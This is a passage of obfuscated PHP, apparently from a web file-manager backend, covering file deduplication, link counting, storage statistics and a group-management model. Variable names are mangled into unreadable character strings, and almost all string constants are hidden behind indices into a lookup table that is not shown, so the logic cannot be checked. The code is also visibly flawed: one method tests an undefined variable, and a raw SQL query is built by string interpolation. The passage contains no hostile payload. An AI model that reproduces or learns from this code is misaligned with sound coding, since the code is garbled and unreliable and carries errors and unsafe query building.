$Û— À«); if ($·ğ•‡õ† = $this->addFileCheckExist($òüÜ Şò[$°®Ô‘[177]], $òüÜ Şò[$°®Ô‘[176]], $òüÜ Şò[$°®Ô‘[76]])) { return $·ğ•‡õ†; } return $this->addFileData($òüÜ Şò); } private function addFileData($ªËÙ—¹ƒ) { $³ª‰™‘ª =& $_SERVER[…É¦À–]; if (!$ªËÙ—¹ƒ) { return !1; } $ªËÙ—¹ƒ[$³ª‰™‘ª[76]] = intval($ªËÙ—¹ƒ[$³ª‰™‘ª[76]]); if (!$ªËÙ—¹ƒ[$³ª‰™‘ª[76]] && strlen($ªËÙ—¹ƒ[$³ª‰™‘ª[177]]) > 32) { $ªËÙ—¹ƒ[$³ª‰™‘ª[76]] = intval(substr($ªËÙ—¹ƒ[$³ª‰™‘ª[177]], 32)); } $ì¸Èı¬É = $this->add($ªËÙ—¹ƒ); return $this->find($ì¸Èı¬É); } public function addFile($·‡³Ø™½, $ŸÎñ¨ëì, $¢èÅæÈ = false) { $åÑÚİŞê =& $_SERVER[…É¦À–]; $üÄ€¨æœ = IO::hashSimple($·‡³Ø™½); $İ¦¸ûø— = IO::size($·‡³Ø™½); $óÖË© = $İ¦¸ûø— <= 1024 * 1024 * 10 ? IO::hashMd5($·‡³Ø™½) : $åÑÚİŞê[12]; $¨ÂÊ£¨ = $åÑÚİŞê[1941] . $üÄ€¨æœ; CacheLock::lock($¨ÂÊ£¨); if ($óÖË© && $üÄ€¨æœ) { $÷×ıöú = $this->addFileCheckExist($üÄ€¨æœ, $óÖË©, $İ¦¸ûø—); if ($÷×ıöú) { CacheLock::unlock($¨ÂÊ£¨); return $÷×ıöú; } } $ãÃı‰ÕŒ = $this->addFileMake($·‡³Ø™½, $İ¦¸ûø—, $üÄ€¨æœ, $óÖË©, $ŸÎñ¨ëì, $¢èÅæÈ); $µÑ°ñß = $this->addFileData($ãÃı‰ÕŒ); CacheLock::unlock($¨ÂÊ£¨); if (!$óÖË© && $µÑ°ñß) { $this->fileMd5Check($µÑ°ñß); } return $µÑ°ñß; } private function fileMd5Check($’š‡…¨ë) { $ÔüâÇî… =& $_SERVER[…É¦À–]; $€Ğ…¿÷ = array($’š‡…¨ë[$ÔüâÇî…[497]], $’š‡…¨ë[$ÔüâÇî…[84]]); $´‘ºé´ì = $ÔüâÇî…[1942] . $’š‡…¨ë[$ÔüâÇî…[84]]; $ÂñÕÑ¶£ = $ÔüâÇî…[1943] . $’š‡…¨ë[$ÔüâÇî…[497]]; $€ÌŸ¯ = TaskQueue::add($ÔüâÇî…[1944], $€Ğ…¿÷, $´‘ºé´ì, $ÂñÕÑ¶£); if (!$€ÌŸ¯) { $this->fileMd5Set($’š‡…¨ë[$ÔüâÇî…[497]], $’š‡…¨ë[$ÔüâÇî…[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($º¶Ÿœ, $Ì•‘€»º) { $«ŸÁ„›À =& $_SERVER[…É¦À–]; $Ì³”¦€ = $this->find($º¶Ÿœ); if (!$Ì³”¦€ || $Ì³”¦€[$«ŸÁ„›À[176]]) { return; } $¢¹¾ô—í = IO::hashMd5($Ì•‘€»º); if (!$¢¹¾ô—í) { return $«ŸÁ„›À[12]; } $this->where(array($«ŸÁ„›À[497] => $º¶Ÿœ))->save(array($«ŸÁ„›À[176] => $¢¹¾ô—í)); } public function addFileMake($¼¦éÛÉŞ, $à£©¦ä‘, $ ã•íå„, $‘•‚æõÚ, $ƒ®…ß…Ø, $Ğ·è¹ÓÌ) { $À±‘íµ± =& $_SERVER[…É¦À–]; $õü‚ğîÅ = $this->createFileName($ƒ®…ß…Ø, $ ã•íå„, $‘•‚æõÚ); $ÎÂ ¼şÙ = get_path_father($õü‚ğîÅ); $¾óÈĞŞµ = get_path_this($õü‚ğîÅ); if ($Ğ·è¹ÓÌ) { $¹şŒ’Û” = IO::move($¼¦éÛÉŞ, $ÎÂ ¼şÙ, !1, $¾óÈĞŞµ); } else { $¹şŒ’Û” = IO::copy($¼¦éÛÉŞ, $ÎÂ ¼şÙ, !1, $¾óÈĞŞµ); } if (!$¹şŒ’Û”) { return !1; } $É³Ş‰µ” = KodIO::defaultDriver(); $ÈÑÆú› = array($À±‘íµ±[574] => $à£©¦ä‘, $À±‘íµ±[1938] => 1, $À±‘íµ±[449] => $ƒ®…ß…Ø, $À±‘íµ±[848] => $É³Ş‰µ”[$À±‘íµ±[428]], $À±‘íµ±[450] => $õü‚ğîÅ, $À±‘íµ±[1939] => $ ã•íå„, $À±‘íµ±[1940] => $‘•‚æõÚ); return $ÈÑÆú›; } public function addFileCheckExist($¢Ì™‡­, $¸¥¸Ø—½, $­ˆ‹îæ²) { $ó—š™”ß =& $_SERVER[…É¦À–]; $ß…ÕÀÄ = $this->findByHash($¢Ì™‡­, $¸¥¸Ø—½); if (!$ß…ÕÀÄ) { return !1; } $Ä©ñå¿‰ = array($ó—š™”ß[1938] => intval($ß…ÕÀÄ[$ó—š™”ß[1945]]) + 1, $ó—š™”ß[574] => $­ˆ‹îæ²); $this->where(array($ó—š™”ß[498] => $ß…ÕÀÄ[$ó—š™”ß[497]]))->save($Ä©ñå¿‰); return $ß…ÕÀÄ; } public function remove($˜ÖÅŸ—™) { $this->linkCountChange($˜ÖÅŸ—™, !1); $this->clearEmpty(); return !0; } public function linkAdd($è¸Ö¹Ü‚) { $this->linkCountChange($è¸Ö¹Ü‚, !0); } public function linkCountChange($ì­§ë, $¦²×œËé) { $Ëá‡»«œ =& $_SERVER[…É¦À–]; if (!$ì­§ë) { return; } if (!is_array($ì­§ë)) { $ì­§ë = array($ì­§ë); } $ÂïÉùÌ® = array(); foreach ($ì­§ë as $ƒìàŒÏ) { $Ì£”š»” = $ƒìàŒÏ . $Ëá‡»«œ[12]; if (!$ÂïÉùÌ®[$Ì£”š»”]) { $ÂïÉùÌ®[$Ì£”š»”] = 0; } $ÂïÉùÌ®[$Ì£”š»”]++; } $ö×éíîÔ = array(); foreach ($ÂïÉùÌ® as $ƒìàŒÏ => $€ŠŒºÅ·) { $Ì£”š»” = $€ŠŒºÅ· . $Ëá‡»«œ[12]; if (!$ö×éíîÔ[$Ì£”š»”]) { $ö×éíîÔ[$Ì£”š»”] = array(); } $ö×éíîÔ[$Ì£”š»”][] = $ƒìàŒÏ; } foreach ($ö×éíîÔ as $€ŠŒºÅ· => $ôª˜É•‡) { if (!$ôª˜É•‡) { continue; } $€ŠŒºÅ· = $¦²×œËé ? $€ŠŒºÅ· : -intval($€ŠŒºÅ·); $İÈ–ğ = array($Ëá‡»«œ[497] => array($Ëá‡»«œ[7], $ôª˜É•‡)); if ($€ŠŒºÅ· < 0) { $İÈ–ğ[$Ëá‡»«œ[1945]] = array($Ëá‡»«œ[1060], abs($€ŠŒºÅ·)); } $this->where($İÈ–ğ)->setAdd($Ëá‡»«œ[1945], $€ŠŒºÅ·); } } public function findByHash($Šüã¯ÔÃ, $Ñê®ÄĞÅ = false) { $ãñ²î©¨ =& $_SERVER[…É¦À–]; if (!$Šüã¯ÔÃ && !$Ñê®ÄĞÅ) { return !1; } $£¼Ñƒğá = array($ãñ²î©¨[1939] => $Šüã¯ÔÃ); if ($Ñê®ÄĞÅ) { $£¼Ñƒğá = array($ãñ²î©¨[1940] => $Ñê®ÄĞÅ); } return $this->order($ãñ²î©¨[1946])->where($£¼Ñƒğá)->find(); } public function clearEmpty($ÊÉ•ÏÒ² = 0) { $œçº¿ğ† =& $_SERVER[…É¦À–]; $¸ÔŠ·˜¢ = time() - 3600 * 24 * $ÊÉ•ÏÒ²; $£¸•°Æ = $œçº¿ğ†[1947] . $¸ÔŠ·˜¢; $ÆÍ¦é˜ = $this->where($£¸•°Æ)->select(); if (!$ÆÍ¦é˜) { return; } $»¢½¹¬ = new Task($œçº¿ğ†[1948], $œçº¿ğ†[12], count($ÆÍ¦é˜)); foreach ($ÆÍ¦é˜ as $¢û·ÕÜá) { $»¢½¹¬->update(1); $this->resetFile($¢û·ÕÜá); } $»¢½¹¬->end(); } public function resetFile($Å¹÷‡®Ò) { $èò±—Ü® =& $_SERVER[…É¦À–]; $²Ç®å¨æ = array($èò±—Ü®[498] => $Å¹÷‡®Ò[$èò±—Ü®[497]]); $åçëœË = Model($èò±—Ü®[1378])->where($²Ç®å¨æ)->count(); $üçä×ÎÜ = Model($èò±—Ü®[1949])->where($²Ç®å¨æ)->count(); $¿Õí°¾Ã = intval($åçëœË) + intval($üçä×ÎÜ); if ($¿Õí°¾Ã == 0) { IO::remove($Å¹÷‡®Ò[$èò±—Ü®[84]]); Model($èò±—Ü®[1950])->delete($Å¹÷‡®Ò[$èò±—Ü®[497]]); $this->where($²Ç®å¨æ)->delete(); $this->metaSet($Å¹÷‡®Ò[$èò±—Ü®[497]], null, null); return; } if ($Å¹÷‡®Ò[$èò±—Ü®[1945]] != $¿Õí°¾Ã) { $this->where($²Ç®å¨æ)->save(array($èò±—Ü®[1938] => $¿Õí°¾Ã)); } } public function storageInfo($¹®»ª¸î = false) { $ŸøŒÔ™ =& $_SERVER[…É¦À–]; $ÜéĞÈº = $this->count() + 0.0; $äÉô‚À = 0; $€É­°¬£ = 1; $òğ˜¶¯Ş = 0; $éåÄª  = 5000; for ($¹£¯éÆŒ = 0; $¹£¯éÆŒ < $ÜéĞÈº; $¹£¯éÆŒ = $¹£¯éÆŒ + $éåÄª ) { $ùÓ¤·ñü = $this->limit($¹£¯éÆŒ, $¹£¯éÆŒ + $éåÄª )->select(); foreach ($ùÓ¤·ñü as $½¸³‘ì¬) { $€É­°¬£ += $½¸³‘ì¬[$ŸøŒÔ™[76]] * $½¸³‘ì¬[$ŸøŒÔ™[1945]]; $äÉô‚À += $½¸³‘ì¬[$ŸøŒÔ™[76]] * ($½¸³‘ì¬[$ŸøŒÔ™[1945]] - 1); $òğ˜¶¯Ş += $½¸³‘ì¬[$ŸøŒÔ™[1945]]; } } $û¸œøˆ = array($ŸøŒÔ™[1951] => $€É­°¬£, $ŸøŒÔ™[1952] => $äÉô‚À, $ŸøŒÔ™[1953] => $äÉô‚À / $€É­°¬£, $ŸøŒÔ™[80] => $ÜéĞÈº, $ŸøŒÔ™[1954] => $òğ˜¶¯Ş); return $û¸œøˆ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\x65" => "\x67\162\157\x75\x70\x5f\x6d\x65\164\x61", "\155\145\x74\141\x46\151\145\x6c\x64" => "\x67\x72\x6f\165\160\111\x44"); protected function cacheFunctionAlias($Ë¿½Ïåã) { $Ÿ×²©¥ê =& $_SERVER[…É¦À–]; return array($Ÿ×²©¥ê[1955] => array($Ë¿½Ïåã[0], $Ÿ×²©¥ê[1956]), $Ÿ×²©¥ê[1957] => array($Ë¿½Ïåã[0], $Ÿ×²©¥ê[1958])); } protected function getInfo($–…ÙÆ¨, $Â»áÂ½¬ = false) { $íÎ³âß = $this->getInfoSimple($–…ÙÆ¨); if (!$íÎ³âß) { return !1; } if ($Â»áÂ½¬) { return $this->_listDataApplyItem($íÎ³âß); } return $this->cacheFunctionGet($_SERVER[…É¦À–][1959], $–…ÙÆ¨); } protected function getInfoSimple($ ØğÅğ, $š¼Ô ÓÛ = false) { $¦ı–Õ»¿ =& $_SERVER[…É¦À–]; if ($š¼Ô ÓÛ) { $«‹×§ÏÎ = array($¦ı–Õ»¿[1877] => intval($ ØğÅğ)); $ö±ÆÆ¼Ÿ = $this->where($«‹×§ÏÎ)->find(); return is_array($ö±ÆÆ¼Ÿ) ? $ö±ÆÆ¼Ÿ : array(); } return $this->cacheFunctionGet($¦ı–Õ»¿[1960], $ ØğÅğ); } protected function groupAdd($·£ãÏİ) { $Ö¥áâ®¥ =& $_SERVER[…É¦À–]; if (!$·£ãÏİ[$Ö¥áâ®¥[461]] && isset($·£ãÏİ[$Ö¥áâ®¥[1877]]) && $·£ãÏİ[$Ö¥áâ®¥[1877]] == 1) { if ($á¬­´Û = $this->getInfoSimple($·£ãÏİ[$Ö¥áâ®¥[1877]], !0)) { return $·£ãÏİ[$Ö¥áâ®¥[1877]]; } } else { $á¬­´Û = $this->getInfoSimple($·£ãÏİ[$Ö¥áâ®¥[461]]); if (!$á¬­´Û) { return !1; } } $å¤ªİ‚Ç = $Ö¥áâ®¥[550]; if ($á¬­´Û[$Ö¥áâ®¥[540]]) { $å¤ªİ‚Ç = $á¬­´Û[$Ö¥áâ®¥[540]] . $á¬­´Û[$Ö¥áâ®¥[1877]] . $Ö¥áâ®¥[50]; } $º›üš›ù = array($Ö¥áâ®¥[449] => $this->groupNameAuto($·£ãÏİ[$Ö¥áâ®¥[461]], $·£ãÏİ[$Ö¥áâ®¥[32]]), $Ö¥áâ®¥[430] => $·£ãÏİ[$Ö¥áâ®¥[461]], $Ö¥áâ®¥[609] => $å¤ªİ‚Ç, $Ö¥áâ®¥[1961] => $·£ãÏİ[$Ö¥áâ®¥[1864]], $Ö¥áâ®¥[1962] => 0, $Ö¥áâ®¥[1881] => 0); if (isset($·£ãÏİ[$Ö¥áâ®¥[1901]])) { $º›üš›ù[$Ö¥áâ®¥[1901]] = $·£ãÏİ[$Ö¥áâ®¥[1901]]; } else { $«§Û™² = $this->max($Ö¥áâ®¥[1901]); if (!$«§Û™²) { $«§Û™² = 0; } $º›üš›ù[$Ö¥áâ®¥[1901]] = $«§Û™² + 1; } if (!empty($·£ãÏİ[$Ö¥áâ®¥[1877]])) { $º›üš›ù[$Ö¥áâ®¥[1877]] = $·£ãÏİ[$Ö¥áâ®¥[1877]]; } $†…ÛùÚĞ = $this->add($º›üš›ù); $this->setNamePinyin($†…ÛùÚĞ, $º›üš›ù[$Ö¥áâ®¥[32]]); if (isset($·£ãÏİ[$Ö¥áâ®¥[1963]])) { $this->metaSet($†…ÛùÚĞ, array($Ö¥áâ®¥[1963] => $·£ãÏİ[$Ö¥áâ®¥[1963]], $Ö¥áâ®¥[1964] => $·£ãÏİ[$Ö¥áâ®¥[1964]])); unset($·£ãÏİ[$Ö¥áâ®¥[1963]]); unset($·£ãÏİ[$Ö¥áâ®¥[1964]]); } Model($Ö¥áâ®¥[1378])->groupRootAdd($†…ÛùÚĞ); $this->_clearCache($·£ãÏİ[$Ö¥áâ®¥[461]]); return $†…ÛùÚĞ; } protected function groupEdit($¸òÚí“Š, $ñäüá‹ƒ) { $Ğ´ÄÒ²ë =& $_SERVER[…É¦À–]; $‚ïŠäÊˆ = $this->getInfoSimple($¸òÚí“Š); if (!$‚ïŠäÊˆ) { return !1; } if (!empty($ñäüá‹ƒ[$Ğ´ÄÒ²ë[461]])) { $„Ğ÷Ë†ñ = $this->getInfoSimple($ñäüá‹ƒ[$Ğ´ÄÒ²ë[461]]); if (!$„Ğ÷Ë†ñ) { return !1; } if ($‚ïŠäÊˆ[$Ğ´ÄÒ²ë[1877]] == $„Ğ÷Ë†ñ[$Ğ´ÄÒ²ë[1877]]) { return !1; } if ($ñäüá‹ƒ[$Ğ´ÄÒ²ë[461]] != $‚ïŠäÊˆ[$Ğ´ÄÒ²ë[461]]) { if ($„Ğ÷Ë†ñ[$Ğ´ÄÒ²ë[540]] !== $‚ïŠäÊˆ[$Ğ´ÄÒ²ë[540]] && strpos($„Ğ÷Ë†ñ[$Ğ´ÄÒ²ë[540]], $‚ïŠäÊˆ[$Ğ´ÄÒ²ë[540]] . $‚ïŠäÊˆ[$Ğ´ÄÒ²ë[1877]] . $Ğ´ÄÒ²ë[50]) === 0) { return !1; } $ñäüá‹ƒ[$Ğ´ÄÒ²ë[609]] = $„Ğ÷Ë†ñ[$Ğ´ÄÒ²ë[540]] . $ñäüá‹ƒ[$Ğ´ÄÒ²ë[461]] . $Ğ´ÄÒ²ë[50]; $this->_changeChildLevel($‚ïŠäÊˆ, $„Ğ÷Ë†ñ); $this->_clearCache($„Ğ÷Ë†ñ[$Ğ´ÄÒ²ë[1877]]); $this->_clearCache($‚ïŠäÊˆ[$Ğ´ÄÒ²ë[461]]); } } if (isset($ñäüá‹ƒ[$Ğ´ÄÒ²ë[32]])) { $this->setNamePinyin($¸òÚí“Š, $ñäüá‹ƒ[$Ğ´ÄÒ²ë[32]]); } if (isset($ñäüá‹ƒ[$Ğ´ÄÒ²ë[1963]])) { $this->metaSet($¸òÚí“Š, array($Ğ´ÄÒ²ë[1963] => $ñäüá‹ƒ[$Ğ´ÄÒ²ë[1963]], $Ğ´ÄÒ²ë[1964] => $ñäüá‹ƒ[$Ğ´ÄÒ²ë[1964]])); unset($ñäüá‹ƒ[$Ğ´ÄÒ²ë[1963]]); unset($ñäüá‹ƒ[$Ğ´ÄÒ²ë[1964]]); } $this->_clearChildrenCache($‚ïŠäÊˆ); return $this->where(array($Ğ´ÄÒ²ë[1965] => $¸òÚí“Š))->save($ñäüá‹ƒ); } private function _clearChildrenCache($³ŠÁ¬å) { $²™ª£îû =& $_SERVER[…É¦À–]; $Î¼Ñ“«ç = array($²™ª£îû[609] => array($²™ª£îû[569], $³ŠÁ¬å[$²™ª£îû[540]] . $³ŠÁ¬å[$²™ª£îû[1877]] . $²™ª£îû[570])); $¥¾ãùˆÈ = $this->field($²™ª£îû[1877])->where($Î¼Ñ“«ç)->select(); foreach ($¥¾ãùˆÈ as $´£Ôôè) { $this->_clearCache($´£Ôôè[$²™ª£îû[1877]]); } } private function _clearCache($„¬ƒ€Æ÷) { $Çäç¼ƒÁ =& $_SERVER[…É¦À–]; $this->cacheFunctionClear($Çäç¼ƒÁ[1959], $„¬ƒ€Æ÷); $this->cacheFunctionClear($Çäç¼ƒÁ[1960], $„¬ƒ€Æ÷); } private function _changeChildLevel($×Ö£şçì, $ì„Ç¥Ô‘, $£¤¹´ = false) { $é ’ºØ˜ =& $_SERVER[…É¦À–]; $ÍÕ¦“»¹ = $×Ö£şçì[$é ’ºØ˜[540]] . $×Ö£şçì[$é ’ºØ˜[1877]] . $é ’ºØ˜[50]; $×“ˆ“Áê = $ì„Ç¥Ô‘[$é ’ºØ˜[540]] . $ì„Ç¥Ô‘[$é ’ºØ˜[1877]] . $é ’ºØ˜[50] . $×Ö£şçì[$é ’ºØ˜[1877]] . $é ’ºØ˜[50]; if ($£¤¹´) { $×“ˆ“Áê = $ì„Ç¥Ô‘[$é ’ºØ˜[540]] . $ì„Ç¥Ô‘[$é ’ºØ˜[1877]] . $é ’ºØ˜[50]; } $…Ş˜œÊæ = array($é ’ºØ˜[609] => array($é ’ºØ˜[569], $×Ö£şçì[$é ’ºØ˜[540]] . $×Ö£şçì[$é ’ºØ˜[1877]] . $é ’ºØ˜[570])); $€–¼Ò  = array($é ’ºØ˜[609] => array($é ’ºØ˜[618], "\162\145\160\x6c\141\x63\145\x28\160\141\x72\x65\x6e\164\114\145\166\145\x6c\54\47{$ÍÕ¦“»¹}\47\54\47{$×“ˆ“Áê}\47\51")); $this->_clearChildrenCache($×Ö£şçì); $this->where($…Ş˜œÊæ)->data($€–¼Ò )->save(); } public function setNamePinyin($ó¾®’é¡, $â³€ç› = false) { $ˆÔ…›Í‹ =& $_SERVER[…É¦À–]; if (!$â³€ç›) { $–®à¶ûÄ = $this->getInfoSimple($ó¾®’é¡); $â³€ç› = $–®à¶ûÄ[$ˆÔ…›Í‹[32]]; } if (!Input::check($â³€ç›, $ˆÔ…›Í‹[612])) { $this->metaSet($ó¾®’é¡, $ˆÔ…›Í‹[494], null); $this->metaSet($ó¾®’é¡, $ˆÔ…›Í‹[493], null); return; } $İŒµ‡º‡ = array($ˆÔ…›Í‹[494] => str_replace($ˆÔ…›Í‹[53], $ˆÔ…›Í‹[12], Pinyin::get($â³€ç›)), $ˆÔ…›Í‹[493] => Pinyin::get($â³€ç›, $ˆÔ…›Í‹[613])); $this->metaSet($ó¾®’é¡, $İŒµ‡º‡); } protected function groupStatus($ëíøá˜û, $ñš¤ìü¶) { $‹ßÆÃ©ô =& $_SERVER[…É¦À–]; $´ì·‰‘ = $this->getInfoSimple($ëíøá˜û); if (!$´ì·‰‘) { return !1; } if ($ñš¤ìü¶ == $‹ßÆÃ©ô[88]) { $±ÏÒ¾™„ = $this->parentLevelArray($´ì·‰‘[$‹ßÆÃ©ô[540]]); } else { $íûúèÇÄ = array($‹ßÆÃ©ô[609] => array($‹ßÆÃ©ô[569], $´ì·‰‘[$‹ßÆÃ©ô[540]] . $´ì·‰‘[$‹ßÆÃ©ô[1877]] . $‹ßÆÃ©ô[570])); $±ÏÒ¾™„ = $this->where($íûúèÇÄ)->field($‹ßÆÃ©ô[1877])->select(); $±ÏÒ¾™„ = array_to_keyvalue($±ÏÒ¾™„, $‹ßÆÃ©ô[12], $‹ßÆÃ©ô[1877]); } $±ÏÒ¾™„[] = $´ì·‰‘[$‹ßÆÃ©ô[1877]]; $Ğ»ËØñ¢ = array(); foreach ($±ÏÒ¾™„ as $ëíøá˜û) { $Ğ»ËØñ¢[] = array($‹ßÆÃ©ô[1877] => $ëíøá˜û, $‹ßÆÃ©ô[94] => $‹ßÆÃ©ô[790], $‹ßÆÃ©ô[403] => $ñš¤ìü¶); $this->_clearCache($ëíøá˜û); } return Model($‹ßÆÃ©ô[1966])->addAll($Ğ»ËØñ¢, array(), !0); } protected function groupRemove($¯ã¿ßµ, $Ó³­ ³ü = false) { $ÓÃ˜­ìî =& $_SERVER[…É¦À–]; $òÉ¤¶ô = array($ÓÃ˜­ìî[1877] => $¯ã¿ßµ); $µô€­Ã = $this->where($òÉ¤¶ô)->find(); if (!$µô€­Ã || $µô€­Ã[$ÓÃ˜­ìî[461]] == 0) { return !1; } if (!$Ó³­ ³ü) { $ŞÛæ£Ô = $this->getInfoSimple($µô€­Ã[$ÓÃ˜­ìî[461]]); $this->_changeChildLevel($µô€­Ã, $ŞÛæ£Ô, !0); $this->where(array($ÓÃ˜­ìî[461] => $¯ã¿ßµ))->save(array($ÓÃ˜­ìî[461] => $µô€­Ã[$ÓÃ˜­ìî[461]])); $this->_clearCache($ŞÛæ£Ô[$ÓÃ˜­ìî[1877]]); } Model($ÓÃ˜­ìî[1966])->where($òÉ¤¶ô)->delete(); Model($ÓÃ˜­ìî[1967])->where($òÉ¤¶ô)->delete(); Model($ÓÃ˜­ìî[865])->groupRootRemove($¯ã¿ßµ); $this->_clearCache($µô€­Ã[$ÓÃ˜­ìî[461]]); return $this->where($òÉ¤¶ô)->delete(); } protected function groupSort($Æ¨â§¢Š) { $»âğƒ—½ =& $_SERVER[…É¦À–]; $ıõ¯×¹× = array(); foreach ($Æ¨â§¢Š as $–ˆ­—™µ => $¥ ú¥¾ï) { $ıõ¯×¹×[] = array($»âğƒ—½[1877], $¥ ú¥¾ï, $»âğƒ—½[1901], $–ˆ­—™µ + 1); } $this->saveAll($ıõ¯×¹×); } public function listData() { $ûÄÔãäú = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ûÄÔãäú[$_SERVER[…É¦À–][398]]); return $ûÄÔãäú; } private function _makeOrder($×±õÌ‰ = '') { $‡šƒõ¿é =& $_SERVER[…É¦À–]; $·¬åß° = array($‡šƒõ¿é[1877], $‡šƒõ¿é[32], $‡šƒõ¿é[1866], $‡šƒõ¿é[201]); $¨ÉÙ‚ğÍ = array($‡šƒõ¿é[479] => $‡šƒõ¿é[480], $‡šƒõ¿é[481] => $‡šƒõ¿é[482]); $ß†ó±—• = Input::get($‡šƒõ¿é[486], $‡šƒõ¿é[7], $‡šƒõ¿é[1881], $·¬åß°); $òÅ¼¶ = Input::get($‡šƒõ¿é[487], $‡šƒõ¿é[7], $‡šƒõ¿é[1968], array($‡šƒõ¿é[1968], $‡šƒõ¿é[481])); $òÅ¼¶ = $¨ÉÙ‚ğÍ[$òÅ¼¶]; $×±õÌ‰ = $×±õÌ‰ . "{$ß†ó±—•}\x20{$òÅ¼¶}\x2c\40\147\162\157\x75\160\111\104\40\x61\x73\143"; return $this->order($×±õÌ‰); } public function listChild($úÁ†›­ƒ) { $ôÔîíû• =& $_SERVER[…É¦À–]; $‰ÛŞ¡¤Ò = $this->where(array($ôÔîíû•[461] => $úÁ†›­ƒ))->_makeOrder()->selectPage(200); $this->_listDataApply($‰ÛŞ¡¤Ò[$ôÔîíû•[398]]); return $‰ÛŞ¡¤Ò; } public function listChildIds($ù† ùæ©) { $šüãï’ˆ =& $_SERVER[…É¦À–]; if (is_string($ì¡Æ×ñğ)) { $ù† ùæ© = explode($šüãï’ˆ[50], $ù† ùæ©); } $ıé²ÍÚ» = $this->where(array($šüãï’ˆ[1877] => array($šüãï’ˆ[7], $ù† ùæ©)))->field($šüãï’ˆ[1969])->select(); if (!$ıé²ÍÚ») { return !1; } $Ú‹µò±æ = array(); foreach ($ıé²ÍÚ» as $÷ÔÏß¥) { $Ú‹µò±æ[] = "\163\x65\x6c\x65\x63\x74\x20\147\x72\x6f\x75\x70\x49\x44\40\146\x72\157\x6d\x20\x60\x67\x72\157\165\x70\140\40\167\150\145\162\x65\40\x70\x61\162\145\x6e\164\x4c\145\166\145\x6c\40\154\x69\153\x65\x20\47{$÷ÔÏß¥[$šüãï’ˆ[540]]}{$÷ÔÏß¥[$šüãï’ˆ[1877]]}\x2c\x25\47"; } $Ú‹µò±æ = implode($šüãï’ˆ[1970], $Ú‹µò±æ); $ıé²ÍÚ» = $this->query($Ú‹µò±æ); if (!$ıé²ÍÚ») { return array(); } $ù† ùæ© = array_to_keyvalue($ıé²ÍÚ», $šüãï’ˆ[12], $šüãï’ˆ[1877]); return array_unique($ù† ùæ©); } public function listByID($Ôù˜Ô‡ˆ) { $Ş¤Ğ´œ =& $_SERVER[…É¦À–]; if (!$Ôù˜Ô‡ˆ) { return array(); } $éÂãÉÁ‘ = array($Ş¤Ğ´œ[1877] => array($Ş¤Ğ´œ[7], $Ôù˜Ô‡ˆ)); $Úóàìï¨ = $this->where($éÂãÉÁ‘)->select(); $Úóàìï¨ = array_sort_keep($Úóàìï¨, $Ş¤Ğ´œ[1877], $Ôù˜Ô‡ˆ); $this->_listDataApply($Úóàìï¨); return $Úóàìï¨; } public function listSearch($­Û–Ë) { $Ê®»ê¡å =& $_SERVER[…É¦À–]; $¹‚ˆúÌ¸ = $­Û–Ë[$Ê®»ê¡å[1971]]; $Øñé®ıß = isset($­Û–Ë[$Ê®»ê¡å[1972]]) ? $­Û–Ë[$Ê®»ê¡å[1972]] : !1; if (!trim($¹‚ˆúÌ¸)) { return !1; } $¹‚ˆúÌ¸ = str_replace($Ê®»ê¡å[1973], $Ê®»ê¡å[1974], $¹‚ˆúÌ¸); $áÍ†Ëä‚ = array($Ê®»ê¡å[1877] => array($Ê®»ê¡å[412], "{$¹‚ˆúÌ¸}\x25"), $Ê®»ê¡å[32] => array($Ê®»ê¡å[412], "\x25{$¹‚ˆúÌ¸}\45"), $Ê®»ê¡å[1045] => $Ê®»ê¡å[1975]); if ($Øñé®ıß) { $ç°«ĞÁ = $this->getInfoSimple($Øñé®ıß); $Ã¨±ª»í = $ç°«ĞÁ[$Ê®»ê¡å[540]] . $Øñé®ıß . $Ê®»ê¡å[570]; $áÍ†Ëä‚ = array($áÍ†Ëä‚, array($Ê®»ê¡å[540] => array($Ê®»ê¡å[412], $Ã¨±ª»í))); } $áÍ†Ëä‚ = $this->parseWhereLike($áÍ†Ëä‚); $Ìø’Ü²Š = $this->_makeOrder()->where($áÍ†Ëä‚)->selectPage(20); $Ìø’Ü²Š = $Ìø’Ü²Š ? $Ìø’Ü²Š : array($Ê®»ê¡å[398] => array(), $Ê®»ê¡å[395] => array()); if (!$Ìø’Ü²Š || count($Ìø’Ü²Š[$Ê®»ê¡å[398]]) < 5 && Input::check($¹‚ˆúÌ¸, $Ê®»ê¡å[347])) { $§Û‚Ñğƒ = $this->groupChildrenAll($Øñé®ıß); $‘œ“»Õ¦ = $this->_searchFromMeta($Ê®»ê¡å[493], $¹‚ˆúÌ¸, 10, $§Û‚Ñğƒ); $ãÙÑ”ø‹ = $this->_searchFromMeta($Ê®»ê¡å[494], $¹‚ˆúÌ¸, 10, $§Û‚Ñğƒ); $Åß´×ƒğ = array_merge($‘œ“»Õ¦, $ãÙÑ”ø‹, $Ìø’Ü²Š[$Ê®»ê¡å[398]]); $Ìø’Ü²Š[$Ê®»ê¡å[398]] = array_unique_by_key($Åß´×ƒğ, $Ê®»ê¡å[1877]); $Ìø’Ü²Š[$Ê®»ê¡å[395]][$Ê®»ê¡å[396]] = count($Ìø’Ü²Š[$Ê®»ê¡å[398]]); $Ìø’Ü²Š[$Ê®»ê¡å[395]][$Ê®»ê¡å[397]] = ceil($Ìø’Ü²Š[$Ê®»ê¡å[395]][$Ê®»ê¡å[396]] / $Ìø’Ü²Š[$Ê®»ê¡å[395]][$Ê®»ê¡å[392]]); } $this->_listDataApply($Ìø’Ü²Š[$Ê®»ê¡å[398]]); return $Ìø’Ü²Š; } protected function groupChildrenAll($©»„È¦¿) { $¸Ÿ§‘² =& $_SERVER[…É¦À–]; if (!$©»„È¦¿) { return !1; } if (is_string($©»„È¦¿)) { $©»„È¦¿ = array($©»„È¦¿); } $ñ÷ö¹ìì = $©»„È¦¿; foreach ($©»„È¦¿ as $Æ™±†´») { $§Í˜Ş±· = $this->getInfoSimple($Æ™±†´»); $§ïşÅõâ = array($¸Ÿ§‘²[540] => array($¸Ÿ§‘²[412], $§Í˜Ş±·[$¸Ÿ§‘²[540]] . $Æ™±†´» . $¸Ÿ§‘²[570])); $ø’äÃË = $this->field($¸Ÿ§‘²[1877])->where($§ïşÅõâ)->select(); $ñ÷ö¹ìì = array_merge($ñ÷ö¹ìì, array_to_keyvalue($ø’äÃË, $¸Ÿ§‘²[12], $¸Ÿ§‘²[1877])); } return array_unique($ñ÷ö¹ìì); } private function _searchFromMeta($±¤Öİ˜æ, $Æ­ù—´, $î¹Ø—øƒ, 